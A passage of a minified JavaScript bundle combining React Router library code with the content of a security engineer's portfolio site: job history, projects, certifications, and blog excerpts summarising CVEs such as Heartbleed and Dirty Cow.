Error!"),ee.createElement("h3",{style:{fontStyle:"italic"}},e),n?ee.createElement("pre",{style:s},n):null,null)}const DS=ee.createElement(NS,null);class IS extends ee.Component{constructor(e){super(e),this.state={location:e.location,revalidation:e.revalidation,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,n){return n.location!==e.location||n.revalidation!=="idle"&&e.revalidation==="idle"?{error:e.error,location:e.location,revalidation:e.revalidation}:{error:e.error!==void 0?e.error:n.error,location:n.location,revalidation:e.revalidation||n.revalidation}}componentDidCatch(e,n){console.error("React Router caught the following error during render",e,n)}render(){return this.state.error!==void 0?ee.createElement(hs.Provider,{value:this.props.routeContext},ee.createElement(g0.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function US(t){let{routeContext:e,match:n,children:i}=t,s=ee.useContext(sh);return s&&s.static&&s.staticContext&&(n.route.errorElement||n.route.ErrorBoundary)&&(s.staticContext._deepestRenderedBoundaryId=n.route.id),ee.createElement(hs.Provider,{value:e},i)}function OS(t,e,n,i){var s;if(e===void 0&&(e=[]),n===void 0&&(n=null),i===void 0&&(i=null),t==null){var r;if(!n)return null;if(n.errors)t=n.matches;else if((r=i)!=null&&r.v7_partialHydration&&e.length===0&&!n.initialized&&n.matches.length>0)t=n.matches;else return null}let a=t,o=(s=n)==null?void 0:s.errors;if(o!=null){let d=a.findIndex(p=>p.route.id&&(o==null?void 0:o[p.route.id])!==void 0);d>=0||Rt(!1),a=a.slice(0,Math.min(a.length,d+1))}let l=!1,c=-1;if(n&&i&&i.v7_partialHydration)for(let d=0;d<a.length;d++){let p=a[d];if((p.route.HydrateFallback||p.route.hydrateFallbackElement)&&(c=d),p.route.id){let{loaderData:h,errors:f}=n,_=p.route.loader&&h[p.route.id]===void 0&&(!f||f[p.route.id]===void 0);if(p.route.lazy||_){l=!0,c>=0?a=a.slice(0,c+1):a=[a[0]];break}}}return a.reduceRight((d,p,h)=>{let f,_=!1,y=null,m=null;n&&(f=o&&p.route.id?o[p.route.id]:void 0,y=p.route.errorElement||DS,l&&(c<0&&h===0?(GS("route-fallback"),_=!0,m=null):c===h&&(_=!0,m=p.route.hydrateFallbackElement||null)));let u=e.concat(a.slice(0,h+1)),g=()=>{let x;return f?x=y:_?x=m:p.route.Component?x=ee.createElement(p.route.Component,null):p.route.element?x=p.route.element:x=d,ee.createElement(US,{match:p,routeContext:{outlet:d,matches:u,isDataRoute:n!=null},children:x})};return n&&(p.route.ErrorBoundary||p.route.errorElement||h===0)?ee.createElement(IS,{location:n.location,revalidation:n.revalidation,component:y,error:f,children:g(),routeContext:{outlet:null,matches:u,isDataRoute:!0}}):g()},null)}var y0=function(t){return t.UseBlocker="useBlocker",t.UseRevalidator="useRevalidator",t.UseNavigateStable="useNavigate",t}(y0||{}),S0=function(t){return t.UseBlocker="useBlocker",t.UseLoaderData="useLoaderData",t.UseActionData="useActionData",t.UseRouteError="useRouteError",t.UseNavigation="useNavigation",t.UseRouteLoaderData="useRouteLoaderData",t.UseMatches="useMatches",t.UseRevalidator="useRevalidator",t.UseNavigateStable="useNavigate",t.UseRouteId="useRouteId",t}(S0||{});function FS(t){let e=ee.useContext(sh);return e||Rt(!1),e}function BS(t){let e=ee.useContext(AS);return e||Rt(!1),e}function zS(t){let e=ee.useContext(hs);return e||Rt(!1),e}function b0(t){let e=zS(),n=e.matches[e.matches.length-1];return n.route.id||Rt(!1),n.route.id}function VS(){var t;let e=ee.useContext(g0),n=BS(),i=b0();return e!==void 0?e:(t=n.errors)==null?void 0:t[i]}function HS(){let{router:t}=FS(y0.UseNavigateStable),e=b0(S0.UseNavigateStable),n=ee.useRef(!1);return v0(()=>{n.current=!0}),ee.useCallback(function(s,r){r===void 0&&(r={}),n.current&&(typeof s=="number"?t.navigate(s):t.navigate(s,Ha({fromRouteId:e},r)))},[t,e])}const Gf={};function GS(t,e,n){Gf[t]||(Gf[t]=!0)}function WS(t,e){t==null||t.v7_startTransition,t==null||t.v7_relativeSplatPath}function Hi(t){Rt(!1)}function jS(t){let{basename:e="/",children:n=null,location:i,navigationType:s=Ki.Pop,navigator:r,static:a=!1,future:o}=t;to()&&Rt(!1);let l=e.replace(/^\/*/,"/"),c=ee.useMemo(()=>({basename:l,navigator:r,static:a,future:Ha({v7_relativeSplatPath:!1},o)}),[l,o,r,a]);typeof i=="string"&&(i=Hr(i));let{pathname:d="/",search:p="",hash:h="",state:f=null,key:_="default"}=i,y=ee.useMemo(()=>{let m=ih(d,l);return m==null?null:{location:{pathname:m,search:p,hash:h,state:f,key:_},navigationType:s}},[l,d,p,h,f,_,s]);return y==null?null:ee.createElement(Gs.Provider,{value:c},ee.createElement(rc.Provider,{children:n,value:y}))}function XS(t){let{children:e,location:n}=t;return LS(pd(e),n)}new Promise(()=>{});function pd(t,e){e===void 0&&(e=[]);let n=[];return ee.Children.forEach(t,(i,s)=>{if(!ee.isValidElement(i))return;let r=[...e,s];if(i.type===ee.Fragment){n.push.apply(n,pd(i.props.children,r));return}i.type!==Hi&&Rt(!1),!i.props.index||!i.props.children||Rt(!1);let a={id:i.props.id||r.join("-"),caseSensitive:i.props.caseSensitive,element:i.props.element,Component:i.props.Component,index:i.props.index,path:i.props.path,loader:i.props.loader,action:i.props.action,errorElement:i.props.errorElement,ErrorBoundary:i.props.ErrorBoundary,hasErrorBoundary:i.props.ErrorBoundary!=null||i.props.errorElement!=null,shouldRevalidate:i.props.shouldRevalidate,handle:i.props.handle,lazy:i.props.lazy};i.props.children&&(a.children=pd(i.props.children,r)),n.push(a)}),n}/**
 * React Router DOM v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function hd(){return hd=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var i in n)Object.prototype.hasOwnProperty.call(n,i)&&(t[i]=n[i])}return t},hd.apply(this,arguments)}function qS(t,e){if(t==null)return{};var n={},i=Object.keys(t),s,r;for(r=0;r<i.length;r++)s=i[r],!(e.indexOf(s)>=0)&&(n[s]=t[s]);return n}function YS(t){return!!(t.metaKey||t.altKey||t.ctrlKey||t.shiftKey)}function $S(t,e){return t.button===0&&(!e||e==="_self")&&!YS(t)}const KS=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],ZS="6";try{window.__reactRouterVersion=ZS}catch{}const JS="startTransition",Wf=H_[JS];function QS(t){let{basename:e,children:n,future:i,window:s}=t,r=ee.useRef();r.current==null&&(r.current=eS({window:s,v5Compat:!0}));let a=r.current,[o,l]=ee.useState({action:a.action,location:a.location}),{v7_startTransition:c}=i||{},d=ee.useCallback(p=>{c&&Wf?Wf(()=>l(p)):l(p)},[l,c]);return ee.useLayoutEffect(()=>a.listen(d),[a,d]),ee.useEffect(()=>WS(i),[i]),ee.createElement(jS,{basename:e,children:n,location:o.location,navigationType:o.action,navigator:a,future:i})}const eb=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",tb=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,zt=ee.forwardRef(function(e,n){let{onClick:i,relative:s,reloadDocument:r,replace:a,state:o,target:l,to:c,preventScrollReset:d,viewTransition:p}=e,h=qS(e,KS),{basename:f}=ee.useContext(Gs),_,y=!1;if(typeof c=="string"&&tb.test(c)&&(_=c,eb))try{let x=new URL(window.location.href),S=c.startsWith("//")?new URL(x.protocol+c):new URL(c),T=ih(S.pathname,f);S.origin===x.origin&&T!=null?c=T+S.search+S.hash:y=!0}catch{}let m=CS(c,{relative:s}),u=nb(c,{replace:a,state:o,target:l,preventScrollReset:d,relative:s,viewTransition:p});function g(x){i&&i(x),x.defaultPrevented||u(x)}return ee.createElement("a",hd({},h,{href:_||m,onClick:y||r?i:g,ref:n,target:l}))});var jf;(function(t){t.UseScrollRestoration="useScrollRestoration",t.UseSubmit="useSubmit",t.UseSubmitFetcher="useSubmitFetcher",t.UseFetcher="useFetcher",t.useViewTransitionState="useViewTransitionState"})(jf||(jf={}));var Xf;(function(t){t.UseFetcher="useFetcher",t.UseFetchers="useFetchers",t.UseScrollRestoration="useScrollRestoration"})(Xf||(Xf={}));function nb(t,e){let{target:n,replace:i,state:s,preventScrollReset:r,relative:a,viewTransition:o}=e===void 0?{}:e,l=_0(),c=no(),d=x0(t,{relative:a});return ee.useCallback(p=>{if($S(p,n)){p.preventDefault();let h=i!==void 0?i:Ol(c)===Ol(d);l(t,{replace:h,state:s,preventScrollReset:r,relative:a,viewTransition:o})}},[c,l,d,i,s,n,t,r,a,o])}function ib({onToggleTheme:t,theme:e}){const n=no(),i=_0(),[s,r]=ee.useState(!1),a=(c,d)=>{c.preventDefault();const p=()=>{const h=document.getElementById(d);h&&h.scrollIntoView({behavior:"smooth",block:"start"})};n.pathname!=="/"?(i("/"),setTimeout(p,120)):p(),r(!1)},o=[{label:"About",anchor:"about"},{label:"Experience",anchor:"experience"},{label:"Projects",to:"/projects"},{label:"Certs",to:"/certifications"},{label:"Blog",to:"/blogs"},{label:"CVE Map",to:"/cve-map"},{label:"Contact",anchor:"contact"}],l=c=>n.pathname===c;return M.jsxs(M.Fragment,{children:[M.jsx("nav",{className:"hud",children:M.jsxs("div",{className:"container hud-inner",children:[M.jsx(zt,{to:"/",className:"hud-brand",children:"Hem Parekh"}),M.jsx("div",{className:"hud-links",children:o.map(c=>c.anchor?M.jsxs("a",{href:`#${c.anchor}`,className:"hud-link",onClick:d=>a(d,c.anchor),children:[M.jsx("span",{children:c.label}),M.jsx("div",{className:"link-track",children:M.jsx("div",{className:"link-track-fill"})})]},c.label):M.jsxs(zt,{to:c.to,className:`hud-link ${l(c.to)?"active":""}`,onClick:()=>r(!1),children:[M.jsx("span",{children:c.label}),M.jsx("div",{className:"link-track",children:M.jsx("div",{className:"link-track-fill"})})]},c.label))}),M.jsxs("div",{className:"hud-actions",children:[M.jsxs("button",{className:"theme-toggle",id:"themeTheme",onClick:t,type:"button",children:["Theme ",e==="dark"?"Light":"Dark"]}),M.jsxs("button",{className:`menu-toggle ${s?"open":""}`,type:"button",onClick:()=>r(c=>!c),"aria-expanded":s,"aria-controls":"hud-menu",children:[M.jsxs("span",{className:"menu-toggle-lines","aria-hidden":"true",children:[M.jsx("span",{className:"menu-line"}),M.jsx("span",{className:"menu-line"}),M.jsx("span",{className:"menu-line"})]}),M.jsx("span",{className:"menu-label",children:"Menu"})]})]})]})}),M.jsx("div",{className:`hud-menu ${s?"open":""}`,id:"hud-menu","aria-hidden":!s,children:M.jsxs("div",{className:"hud-menu-list",children:[o.map(c=>c.anchor?M.jsxs("a",{href:`#${c.anchor}`,className:"menu-link",onClick:d=>a(d,c.anchor),children:[M.jsx("span",{children:c.label}),M.jsx("div",{className:"link-track",children:M.jsx("div",{className:"link-track-fill"})})]},c.label):M.jsxs(zt,{to:c.to,className:"menu-link",onClick:()=>r(!1),children:[M.jsx("span",{children:c.label}),M.jsx("div",{className:"link-track",children:M.jsx("div",{className:"link-track-fill"})})]},c.label)),M.jsx("button",{className:"btn",type:"button",onClick:()=>r(!1),children:"Close"})]})})]})}const fd=[{href:"https://github.com/Hem1700",icon:"fab fa-github",label:"GitHub"},{href:"https://www.linkedin.com/in/hem-parekh/",icon:"fab fa-linkedin-in",label:"LinkedIn"},{href:"https://medium.com/@hemparekh1596",icon:"fab fa-medium",label:"Medium"},{href:"https://tryhackme.com/r/p/beatmonk",icon:"fas fa-terminal",label:"TryHackMe"},{href:"https://app.hackthebox.com/profile/overview",icon:"fas fa-user-secret",label:"HackTheBox"}],sb={title:"Hello, I'm Hem Parekh.",highlight:"Hem Parekh",image:"/images/heading_image.webp",blurb:"Security engineer and pen tester building hardened systems, staging exploit labs, and mapping attack surfaces before adversaries do."},qf={title:"ABOUT ME",image:"/images/profile.jpeg",text:"I’m Hem Parekh, a Security Engineer and Pen Tester who thrives on building resilient software and unearthing vulnerabilities. I blend engineering discipline with a hacker’s curiosity to design secure systems and to stress-test the ones that already exist. When I’m not pulling threads on a bug, I’m writing up what I find so other defenders can move faster."},rb=[{range:"Mar 2025 - Present",role:"Privacy Engineer",org:"Amazon",desc:"Driving privacy-by-design reviews and mitigating data exposure risks across services; partnering with engineering teams to embed controls and streamline compliance."},{range:"May 2024 - Dec 2024",role:"Cybersecurity Engineer Intern",org:"Toshiba Global Commerce Solution",desc:"Conducted penetration testing on over 25 web applications, identifying critical vulnerabilities, automating processes, and improving operational efficiency."},{range:"Jan 2023 - Aug 2023",role:"Research Assistant",org:"Rochester Institute of Technology",desc:"Applied knowledge of security standards, including NIST SP 800-53 and ISO/IEC 27001, conducting risk assessments and implementing controls to mitigate risks effectively."},{range:"Sep 2023 - May 2024",role:"Cybersecurity Analyst Intern",org:"Langan Engineering and Environmental Services",desc:"Conducted vulnerability assessments and penetration tests across 18 internal systems, contributing to enterprise security and developing NIST-27001-compliant documentation."},{range:"June 2021 - July 2022",role:"Security Operational Analyst (SOC)",org:"RNS Technology",desc:"Monitored 100+ security devices, responded to threat alerts, and conducted root cause analyses to enhance system security and data integrity."}],w0=[{title:"Phish Analyzer Tool",description:"A patented desktop application designed to analyze and secure against phishing emails, featuring sandbox configurations, advanced security mechanisms, and a user-friendly interface to enhance threat detection and response.",href:"https://github.com/Hem1700/sita",tags:["Security","Desktop"]},{title:"Secure Communication Using Image Exif Data",description:"Explored the innovative use of image Exif data for covert communication. Developed methodologies for securely embedding and transmitting sensitive information through image metadata.",href:"https://drive.google.com/file/d/1WcmhCJQN_b8jad3dQoGplBmO6EN1leYZ/view?usp=sharing",tags:["Research","Security"]},{title:"Architecture and Advancement in Virtualization of TPM",description:"Explored the architecture and advancements of virtual Trusted Platform Modules (vTPMs) in virtual and cloud environments. The project highlighted security flaws, key-sharing mechanisms, and the migration challenges associated with vTPMs, proposing solutions for enhanced security and trust in virtualization.",href:"https://drive.google.com/file/d/1Y2vyRjVBgjy6QB9_qn_taJUrYCodehHT/view?usp=sharing",tags:["Research","Cloud"]},{title:"Quantum Key Distribution",description:"This project delves into the rapidly evolving field of quantum cryptography, focusing on Quantum Key Distribution (QKD). It explores innovative methods to increase QKD transmission distance while maintaining secure data transmission, addressing challenges such as key generation rates, distance limitations, and potential vulnerabilities.",href:"https://drive.google.com/file/d/17vZRyJyKYX7CmUgC1iBQf4buEsBgoC30/view?usp=sharing",tags:["Research","Cryptography"]},{title:"SecTool: The Comprehensive Cybersecurity Toolkit",description:"SecTool is a versatile cybersecurity toolkit with features like keylogging, OSINT, payload generation, hash cracking, network analysis, social engineering tools, web vulnerability detection, and more. It’s a comprehensive solution for security testing and digital defense.",href:"https://github.com/Hem1700/sectool",tags:["Security","Toolkit"]},{title:"Website Crawler",description:"A lightweight and efficient web crawler designed to scrape, analyze, and extract data from websites, enabling seamless data collection for various use cases.",href:"https://github.com/Hem1700/Website-crawler",tags:["Web","Automation"]}],M0=[{title:"CompTIA Security+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/7270d02f-a0d1-483a-8000-8ebd2b628391/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Pentest+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/d93ed2a7-c86b-42ec-b4e4-7a7d2a2cd972/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA CySA+",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/d6a9802e-23b8-4a0a-83e1-edc7e89a457c/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Vulnerability Assessment Professional (CVNP)",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/59404c7e-7680-45a9-8622-2a76f603c0c7/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Security Analytics Professional (CSAP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/8c6cca3e-0eb1-4920-8eff-826998743336/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Security Professional (CNSP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/08f2dd46-295b-402c-bc67-29189bea83ff/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"ICS2 Certified in Cybersecurity (CC)",details:"Issued Oct 2024 - Expires Oct 2027",href:"https://www.credly.com/badges/c16c4d43-1e84-44ab-bebe-38d747073ccb/linked_in_profile",domain:"Security",issuer:"ISC2"},{title:"AWS Certified Cloud Practitioner (CCP)",details:"Issued Mar 2024 - Expires Mar 2027",href:"https://www.credly.com/badges/6a0d691b-b3b2-4d44-addb-f2b5b171e83d/linked_in_profile",domain:"Cloud",issuer:"AWS"},{title:"Microsoft Azure Security, Compliance and Identity Fundamentals (SC-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-us/HemParekh-9873/BD2B5E59D28A7F54?sharingId=1D33B191273E7834",domain:"Cloud",issuer:"Microsoft"},{title:"Microsoft Azure Fundamentals (AZ-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-gb/HemParekh-9873/8B3B97F4E45B9F2C?sharingId",domain:"Cloud",issuer:"Microsoft"},{title:"CCNA: Introduction to Networks",details:"Issued Jun 2020 by Cicso - No expiration",href:"https://www.credly.com/badges/be753401-bd44-4d09-81d7-33af049e6fad/linked_in_profile",domain:"Networking",issuer:"Cisco"},{title:"Cisco: Endpoint Security",details:"Issued Nov 2024 by Cicso - No expiration",href:"https://www.credly.com/badges/9e4309a6-089f-4259-8333-c9c501666c77/linked_in_profile",domain:"Security",issuer:"Cisco"}],ab={title:"Ops Log // Latest Signals",subtitle:"Field notes from exploit labs, CVE hunts, and defensive experiments.",social:[{href:"#",icon:"fab fa-twitter"},{href:"#",icon:"fab fa-linkedin-in"},{href:"#",icon:"fab fa-github"},{href:"#",icon:"fab fa-instagram"}]},Ga=[{slug:"kernel_surface_audit_blog",title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",href:"/blog/kernel_surface_audit_blog",excerpt:"A defender’s walkthrough on who should vs. who can modify your kernel image, dangerous root patterns, and a Python-based audit checklist to watch /boot/vmlinuz-*.",date:"December 8, 2025",readTime:"7 min read"},{slug:"cve-2022-26318-re-blog",title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",href:"/blog/cve-2022-26318-re-blog",excerpt:"Defender-focused RE of CVE-2022-26318: how the /agent/login path reaches wgagent, SAX parsing overflow mechanics, watchpoint-driven proof, and patch/detection guidance without weaponized details.",date:"December 28, 2025",readTime:"10 min read"},{slug:"react2shell-toy-lab",title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',href:"/blog/react2shell-toy-lab",excerpt:'Build a tiny "fake Flight" Node lab to see how insecure deserialization and thenable handling can lead to RCE, plus a safer variant and takeaways that mirror React2Shell.',date:"December 8, 2025",readTime:"8 min read"},{slug:"transient_scheduler_attacks_tsa_blog",title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",href:"/blog/transient_scheduler_attacks_tsa_blog",excerpt:"AMD’s new TSA class abuses false completions in the instruction scheduler to leak data across privilege boundaries. Here’s what TSA is, how an attacker could exploit it, a tiny timing lab to feel the leak, and what defenders should do.",date:"December 4, 2025",readTime:"8 min read"},{slug:"firmware_llm_annotator",title:"Firmware Exploration: LLM as Your Annotator",href:"/blog/firmware_llm_annotator",excerpt:"How to use an LLM as a helper for firmware reversing: triaging strings, summarizing decompiled functions, and annotating config blobs while you stay in control of the analysis.",date:"November 30, 2025",readTime:"5 min read"},{slug:"1001",title:"CVE-2024–1001",href:"/blog/1001",excerpt:"Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0012",title:"CVE-2024–0012",href:"/blog/0012",excerpt:"CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.",date:"September 8, 2024",readTime:"3 min read"},{slug:"40982",title:"CVE-2022–40982",href:"/blog/40982",excerpt:"A critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.",date:"September 8, 2024",readTime:"3 min read"},{slug:"cow",title:"CVE-2016–5195",href:"/blog/cow",excerpt:"In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.",date:"September 8, 2024",readTime:"3 min read"},{slug:"symlinks",title:"Symbolic Links (Symlinks) in Linux",href:"/blog/symlinks",excerpt:"TIn Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. To know more read the blog.",date:"September 8, 2024",readTime:"3 min read"},{slug:"23397",title:"CVE-2023–23397",href:"/blog/23397",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0160",title:"CVE-2014-0160",href:"/blog/0160",excerpt:"Heartbleed’s simplicity and devastating impact exposed the internet’s underlying fragility, and despite extensive efforts to patch affected systems, its ghost still haunts forgotten and neglected systems today. Let’s explore the technical details of this vulnerability, the global chaos it caused, and why it’s still relevant.",date:"September 8, 2024",readTime:"3 min read"},{slug:"11882",title:"CVE-2017-11882",href:"/blog/11882",excerpt:"One of the most notorious among these is CVE-2017–11882, commonly known as the Microsoft Office Memory Corruption Vulnerability. Originating in 2000, this vulnerability remains a frequently exploited entry point for attackers worldwide, from nation-state actors to cyber criminals.",date:"October 26 2024",readTime:"3 min read"},{slug:"robot",title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",href:"/blog/robot",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"poodle",title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",href:"/blog/poodle",excerpt:"This blog provides an in-depth look at Zombie Poodle and Goldendoodle attacks, how they work, and their implications for modern cybersecurity.",date:"September 6, 2024",readTime:"6 min read"}];function ob(){return M.jsx("footer",{className:"footer",children:M.jsxs("div",{className:"container footer-grid",children:[M.jsxs("div",{children:[M.jsx("h4",{children:"Sitemap"}),M.jsx(zt,{to:"/",children:"Home"}),M.jsx("br",{}),M.jsx(zt,{to:"/projects",children:"Projects"}),M.jsx("br",{}),M.jsx(zt,{to:"/certifications",children:"Certifications"}),M.jsx("br",{}),M.jsx(zt,{to:"/blogs",children:"Blog"}),M.jsx("br",{}),M.jsx(zt,{to:"/cve-map",children:"CVE Map"})]}),M.jsxs("div",{children:[M.jsx("h4",{children:"Connect"}),fd.map(t=>M.jsx("div",{children:M.jsx("a",{href:t.href,target:"_blank",rel:"noreferrer",children:t.label})},t.href))]})]})})}function lb({links:t=[]}){return M.jsx("div",{className:"social-icons",children:t.map(e=>M.jsx("a",{href:e.href,target:"_blank",rel:"noreferrer","aria-label":e.label||"Social link",children:M.jsx("i",{className:e.icon})},e.href))})}function E0(t=.15){const e=ee.useRef(null),[n,i]=ee.useState(!1);return ee.useEffect(()=>{const s=e.current;if(!s)return;const r=new IntersectionObserver(([a])=>{a.isIntersecting&&(i(!0),r.unobserve(a.target))},{threshold:t});return r.observe(s),()=>r.disconnect()},[t]),[e,n]}function cb({data:t,socials:e}){const[n,i]=E0();return M.jsx("section",{className:`section about reveal ${i?"visible":""}`,id:"about",ref:n,children:M.jsxs("div",{className:"container about-grid",children:[M.jsxs("div",{className:"about-copy",children:[M.jsx("div",{className:"eyebrow",children:"About"}),M.jsx("h2",{className:"section-title",children:t.title}),M.jsx("p",{className:"lead",children:t.text}),M.jsx(lb,{links:e})]}),M.jsx("div",{className:"about-media",children:M.jsx("img",{src:t.image,alt:t.title})})]})})}function T0({posts:t=[],page:e=1,totalPages:n=1,onPageChange:i,wrap:s=!0}){const r=M.jsxs(M.Fragment,{children:[t.map(a=>M.jsxs("article",{className:"blog-row",children:[M.jsxs("div",{className:"blog-row-meta",children:[M.jsx("div",{className:"blog-row-date",children:a.date}),M.jsx("div",{className:"blog-row-time",children:a.readTime})]}),M.jsxs("div",{className:"blog-row-body",children:[M.jsx(zt,{to:a.href,className:"blog-row-title",children:a.title}),M.jsx("p",{className:"blog-row-excerpt",children:a.excerpt}),M.jsx("div",{className:"blog-tags",children:M.jsx("span",{className:"pill",children:"Security"})})]}),M.jsx("div",{className:"blog-row-cta",children:M.jsx(zt,{to:a.href,className:"view-credentials",children:"Read"})})]},a.title)),n>1&&M.jsxs("div",{className:"blog-pagination",children:[M.jsx("button",{className:"pill",disabled:e===1,onClick:()=>i==null?void 0:i(Math.max(1,e-1)),type:"button",children:"Previous"}),M.jsxs("span",{className:"blog-page-indicator",children:["Page ",e," of ",n]}),M.jsx("button",{className:"pill",disabled:e===n,onClick:()=>i==null?void 0:i(Math.min(n,e+1)),type:"button",children:"Next"})]})]});return s?M.jsx("section",{className:"blog-list-section",children:M.jsx("div",{className:"container blog-list",children:r})}):M.jsx("div",{className:"blog-list",children:r})}function ub({issuer:t="Cert"}){var n;const e=((n=t==null?void 0:t[0])==null?void 0:n.toUpperCase())||"C";return M.jsx("div",{className:"cert-badge",children:e})}const db=["All","Security","Cloud","Networking"];function A0({items:t=[],showViewAll:e=!1,showHeader:n=!0,wrap:i=!0}){const[s,r]=ee.useState("All"),[a,o]=ee.useState(1),l=5,c=ee.useMemo(()=>s==="All"?t:t.filter(_=>_.domain?_.domain===s:!0),[s,t]),d=Math.max(1,Math.ceil(c.length/l)),p=c.slice((a-1)*l,a*l),h=_=>{r(_),o(1)},f=M.jsxs(M.Fragment,{children:[n&&M.jsxs("div",{className:"section-header",children:[M.jsx("div",{children:M.jsx("h2",{className:"section-title",children:"Certifications"})}),e&&M.jsx("div",{className:"section-actions",children:M.jsx(zt,{className:"link-button",to:"/certifications",children:"View all certifications"})})]}),n&&M.jsx("div",{className:"filter-chips",children:db.map(_=>M.jsx("button",{className:`chip ${_===s?"active":""}`,type:"button",onClick:()=>h(_),children:_},_))}),M.jsx("div",{className:"cert-list",children:p.map(_=>M.jsxs("div",{className:"cert-row",children:[M.jsxs("div",{className:"cert-row-meta",children:[M.jsx("div",{className:"cert-row-badge",children:M.jsx(ub,{issuer:_.issuer})}),M.jsxs("div",{className:"cert-row-tags",children:[M.jsx("span",{className:"pill",children:_.domain}),M.jsx("span",{className:"pill",children:_.issuer})]})]}),M.jsxs("div",{className:"cert-row-body",children:[M.jsx("div",{className:"cert-row-title",children:_.title}),M.jsx("p",{className:"cert-row-details",children:_.details})]}),M.jsx("div",{className:"cert-row-cta",children:M.jsx("a",{href:_.href,className:"view-credentials",target:"_blank",rel:"noreferrer",children:"View"})})]},_.title))}),d>1&&M.jsxs("div",{className:"blog-pagination project-pagination",children:[M.jsx("button",{className:"pill",disabled:a===1,onClick:()=>o(Math.max(1,a-1)),type:"button",children:"Previous"}),M.jsxs("span",{className:"blog-page-indicator",children:["Page ",a," of ",d]}),M.jsx("button",{className:"pill",disabled:a===d,onClick:()=>o(Math.min(d,a+1)),type:"button",children:"Next"})]})]});return i?M.jsx("section",{className:"section certifications",id:"certs",children:M.jsx("div",{className:"container",children:f})}):M.jsx("div",{className:"certifications",children:f})}function pb({data:t}){const[e,n]=E0();return M.jsx("header",{className:`hero reveal ${n?"visible":""}`,id:"home",ref:e,children:M.jsxs("div",{className:"container hero-grid",children:[M.jsxs("div",{className:"hero-copy",children:[M.jsx("div",{className:"eyebrow",children:"Security engineer // pen tester"}),M.jsxs("div",{className:"hero-lines mbm",children:[M.jsx("h1",{className:"hero-display",children:"A different"}),M.jsx("h1",{className:"hero-display",children:"security"}),M.jsx("h1",{className:"hero-display",children:"approach"})]}),M.jsx("p",{className:"hero-lead",children:t.blurb}),M.jsxs("div",{className:"hero-actions",children:[M.jsx(zt,{className:"button primary",to:"/projects",children:"View Projects"}),M.jsx(zt,{className:"button ghost",to:"/certifications",children:"View Certifications"})]}),M.jsxs("div",{className:"hero-meta",children:[M.jsx("span",{className:"pill",children:"Threat Hunting"}),M.jsx("span",{className:"pill",children:"Application Security"}),M.jsx("span",{className:"pill",children:"Privacy"})]})]}),M.jsx("div",{className:"hero-visual",children:M.jsx("div",{className:"hero-image-frame",children:M.jsx("img",{src:t.image,alt:t.highlight})})})]})})}const hb=["All","Security","Research","Web","Desktop","Cloud","Automation","Cryptography","Toolkit"];function fb({activeFilter:t,onFilterChange:e}){return M.jsx("div",{className:"filter-chips",children:hb.map(n=>M.jsx("button",{className:`chip ${n===t?"active":""}`,type:"button",onClick:()=>e(n),children:n},n))})}function mb({items:t}){const[e,n]=ee.useState(0);if(!(t!=null&&t.length))return null;const i=t[e],s=()=>n(a=>(a+1)%t.length),r=()=>n(a=>(a-1+t.length)%t.length);return 